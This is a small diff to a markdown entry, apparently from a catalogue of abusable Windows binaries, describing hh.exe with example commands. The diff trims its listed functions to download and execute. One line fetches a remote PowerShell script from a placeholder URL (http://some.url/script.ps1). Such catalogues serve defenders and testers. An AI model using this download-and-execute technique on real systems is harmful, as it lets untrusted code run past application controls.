@@ -1,15 +1,15 @@
 ## hh.exe
 
-* Functions: Open Explorer, Download, Execute
+* Functions: Download, Execute
 
 ```
 HH.exe http://www.google.com      
 
-HH.exe C:\  
+HH.exe C:\    
 
-HH.exe c:\windows\system32\calc.exe
+HH.exe c:\windows\system32\calc.exe    
 
-HH.exe http://some.url/script.ps1
+HH.exe http://some.url/script.ps1    
 ```
 
 Acknowledgements:
